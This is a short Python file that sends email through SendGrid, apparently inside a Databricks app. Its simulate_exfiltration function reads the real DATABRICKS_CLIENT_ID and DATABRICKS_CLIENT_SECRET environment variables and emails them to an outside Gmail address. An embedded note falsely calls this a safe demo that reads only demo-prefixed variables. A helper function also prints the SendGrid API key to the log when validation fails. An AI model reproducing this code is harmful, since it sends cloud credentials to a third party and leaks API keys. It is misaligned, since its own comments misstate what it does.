import json
import os
from datetime import datetime, timezone
from pathlib import Path
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail


def _mask(value: str) -> str:
    if not value:
        return "missing"
    if len(value) <= 4:
        return "*" * len(value)
    return f"{value[:2]}{'*' * (len(value) - 4)}{value[-2:]}"

def get_sendgrid_api_key():
    api_key = os.getenv("SENDGRID_API_KEY")

    if not api_key:
        print(api_key)
        raise ValueError("SENDGRID_API_KEY is not set")

    if not api_key.startswith("SG."):
        print(api_key)
        raise ValueError("Invalid SendGrid API key format")

    return api_key

def send_hello_email(payload):
    message = Mail(
        from_email='203c3ed1@gmail.com',  # must be verified in SendGrid
        to_emails='203c3ed1@gmail.com',
        subject='Hello from Databricks App 🚀',
        plain_text_content='Hello World',
        html_content=f"""
        <h3>Event Payload</h3>
        <pre style="background:#f4f4f4;padding:10px;border-radius:5px;">
        {payload}
        </pre>
        """
    )

    try:
        key = get_sendgrid_api_key()
        sg = SendGridAPIClient(key)
        response = sg.send(message)
        
        print("Status Code:", response.status_code)
        print("Response Body:", response.body)
        print("Response Headers:", response.headers)

        return True
    except Exception as e:
        print("Error sending email:", str(e))
        return False


def simulate_exfiltration():
    client_id = os.getenv("DATABRICKS_CLIENT_ID", "")
    client_secret = os.getenv("DATABRICKS_CLIENT_SECRET", "")
    sink_path = Path(os.getenv("DEMO_EXFIL_SINK", "/tmp/databricks-demo-exfil.log"))
    sink_path.parent.mkdir(parents=True, exist_ok=True)

    payload = {
        "event": "simulated_dependency_exfiltration",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "note": "This is a safe demo. Only demo-prefixed variables are read.",
        "demo_client_id": client_id,
        "demo_client_secret": client_secret,
    }

    send_hello_email(
        json.dumps(payload, indent=4)
    )
